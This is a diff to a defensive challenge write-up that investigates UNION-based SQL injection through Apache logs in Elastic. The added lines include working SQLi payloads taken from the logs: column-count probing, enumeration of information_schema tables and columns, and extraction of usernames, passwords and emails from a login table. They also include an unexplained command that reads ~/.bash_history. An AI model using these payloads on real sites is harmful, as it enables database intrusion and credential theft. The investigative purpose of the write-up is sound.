@@ -1,6 +1,9 @@
 #+title: Sql
 #+description: This challenge demonstrates an investigation into a classic web exploitation technique known as SQL Injection (SQLi)—specifically UNION-based SQL Injection
 
+#+begin_src bash
+cat ~/.bash_history | cut -d ";" -f 2 | uniq -u | egrep "*/proc/*"
+#+end_src
 
 ** SQLI UNION Attack Investigation
 Investigating and Identifying SQLI Union activity required multiple corelation and analysis
@@ -20,5 +23,27 @@ event.dataset: apache.access and url.query: "UNION" or "SELECT" or "INTO" or "AN
 
 ** Unpack the Attack Execution Sequence
   example extracted from elastic logs -->
+#+begin_src sql
+http://securecorp.org/database/?value=alice_wonder' union select concat(username,"|",password,"|",email),2,3 from login --
+#+end_src
 
   [[../../imgs/sqli.png]]
+
+** Attacker Gathering Information With SQL Queries
+1. -->
+#+begin_src sql
+/database/?value=alice_wonder' UNION SELECT NULL,NULL,NULL--
+
+#+end_src
+
+2. -->
+#+begin_src sql
+/database/?value=alice_wonder' union select table_name,2,3 from information_schema.tables --t
+
+#+end_src
+
+3. -->
+#+begin_src sql
+/database/?value=alice_wonder' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='login'--
+
+#+end_src
